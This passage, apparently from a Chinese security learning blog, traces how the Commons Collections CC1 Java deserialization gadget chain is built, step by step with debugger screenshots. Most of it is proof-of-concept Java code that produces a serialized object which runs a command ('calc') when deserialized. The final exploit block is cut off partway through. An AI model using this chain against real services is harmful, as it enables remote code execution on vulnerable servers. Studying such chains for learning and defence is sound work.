注意此时仍然在TransformedMap中, 这个entrySet()是继承来的</p><p>跟进isSetValueChecking()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221426861.png" alt="image-20240318221426861"></p><p>这里回到了TransformedMap自己的isSetValueChecking()方法, 由于valueTransformer赋值了, 所以返回true</p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221554102.png" alt="image-20240318221554102"></p><p>注意这个EntrySet(), 第二个参数是this, 也就是本身, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221800461.png" alt="image-20240318221800461"></p><p>这里恍然大悟, this.parent就是这个对象本身, 此时这个对象就是TransformedMap实例, 它下面的checkSetValue正是我们要调用到的方法</p><p>至此这个谜团就被解开了</p><p>那么我们从decorate开始, 编写一段poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;n4c1&quot;</span>, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317184029496.png" alt="image-20240317184029496"></p><p>成功调用</p><p>至此, 链子就延伸到了setValue</p><p>依旧是find usages, 看看哪里调用了setValue</p><p>这里应该是要搜索找一个AnnotationInvocationHandler类, 但是我并没有找到</p><p>所以直接去到目录下找了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317205707923.png" alt="image-20240317205707923"></p><p>这里是点进去是.class文件, 看见的就是反编译后的代码, 那么就可以肯定是配置源码那一步出错了</p><p>找了半天发现之前sun包的替换搞错了, 正确的路径: jdk-af660750b2f4\src\share\classes\sun</p><p>应该使用这里的sun包加到djk的src中去</p><p>之后就可以找到AnnotationInvocationHandler这个类, 它重写了应该readObject方法且在readObject中进行了对集合的遍历 并且调用了setValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223012579.png" alt="image-20240318223012579"></p><p>我们的第一想法应该是去控制这个memberValues()</p><p>可以看见在构造函数中对其进行了赋值, 但是这个构造函数并没有public修饰</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223208459.png" alt="image-20240318223208459"></p><p>因此需要用反射获取这个类</p><p>这里构造函数的第一个参数Class&lt;? extends Annotation&gt;表示一个注解类</p><p><strong>什么是注解类?</strong></p><p><a href="https://www.runoob.com/w3cnote/java-annotation.html">https://www.runoob.com/w3cnote/java-annotation.html</a></p><p>按我个人理解, 这与python的装饰器有一丝的相似之处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedmap);<span class="comment">//传入一个Target类, 他就是一个注解类</span></span><br></pre></td></tr></table></figure><p>由此就可以调用到memberValue.setValue即transformedmap.setValue</p><p>但是眼前又出现了一个问题, 就是如何满足这里的if条件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240320220648856.png" alt="image-20240320220648856"></p><p>这里先放一放</p><p>实际上, 一共有三个问题待解决</p><ol><li>由于只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列, 而Runtime并没有实现, Runtime无法被序列化便是第一个问题</li><li>上图中memberValue.setValue的参数并不是我们预期的内容</li><li>如何两个if</li></ol><p>首先是如何序列化Runtime</p><p><code>Runtime</code>是不能序列化的，但是<code>Runtime.class</code>是可以序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>s Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        run.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>InvokerTransformer</code>反射调用Runtime</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//InvokerTransformer反射获取Runtime的getRuntime方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//InvokerTransformer反射 执行获取到的getRuntime方法, 返回一个runtime对象</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(runmethod);</span><br><span class="line">        <span class="comment">//反射获取Runtime下的exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">execmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br><span class="line">        </span><br><span class="line">        execmethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321194633809.png" alt="image-20240321194633809"></p><p>这里虽然成功了, 但是紧接着就出现了另一个问题, 在一开始我们只向TransformedMap.decorate中传入了一个我们精心构造的invokerTransformer对象, 而现在变成了这样一串代码, 也就是从一次transform的调用变成了多次transform的调用</p><p>这里移步至ChainedTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321200533277.png" alt="image-20240321200533277"></p><p>这里的transform进行了对iTransformers[i]的递归调用, 正好就是我们反射代码中的过程, 我们只需要将iTransformers[i]赋值为invokerTransformer即可,这样就通过同名函数调用到我们需要的那个transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>与之前的代码拼接, 构造一个transformedmap, 利用AnnotationInvocationHandler中readObject中的setValue去调用transformedmap中的checkSetValue</p><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入序列化与反序列化接口来触发readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);<span class="comment">//////////////传入注解类和transformedmap</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321210044455.png" alt="image-20240321210044455"></p><p>发现没有进去if</p><p>首先我们需要memberType !&#x3D; null</p><p>不难发现memberValue就是传入的map(有一个键值对”bbb”,”aaa”), 在这里获取了它的键, 并将memberTypes下此键的值赋给memberType </p><p>memberType 由 memberTypes设置, memberTypes由annotationType.memberTypes()设置, 跟进annotationType</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321211135555.png" alt="image-20240321211135555"></p><p>可以看见,调试器已经标记出来了, 这里的type就是我们传入的注解类</p><p>我们传入的注解类是Override, 但是Override中并没有bbb这个属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213340551.png" alt="image-20240321213340551"></p><p>因此考虑别的注解类</p><p>Target注解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213414486.png" alt="image-20240321213414486"></p><p>可以看见Target有一个value属性, 因此我们可以将map键名改为value</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213644208.png" alt="image-20240321213644208"></p><p>这样就直接进入到了两个if中</p><p>但是这里还有问题,会报错</p><p>这是因为 为了避免Runtime无法序列化的问题, 我们需要从Runtime.class开始 反射获取getRuntime方法, 再获取Runtime对象, 再获取exec方法</p><p>而我们是从一个递归调用可控对象的transform方法开始的, 我们能传入的只是对象的数组, 如何将把Runtime.class放在反射链的首部又变成了一个新的问题</p><p>这里又移步至ConstantTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215356371.png" alt="image-20240321215356371"></p><p>一切都是这么的巧, 这个类下有一个transform方法, 它返回传入的参数, 我们只需要实例化它, 并构造函数传参为Runtime.class, 这要Runtime.class就会被返回回来, 成为反射链子的首部</p><p>之后Runtime.class会成为下一次transform的参数(object), 从而绕过AnnotationInvocationHandler下setValue中参数不可控的问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330114646344.png" alt="image-20240330114646344"></p><p>最终利用代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span 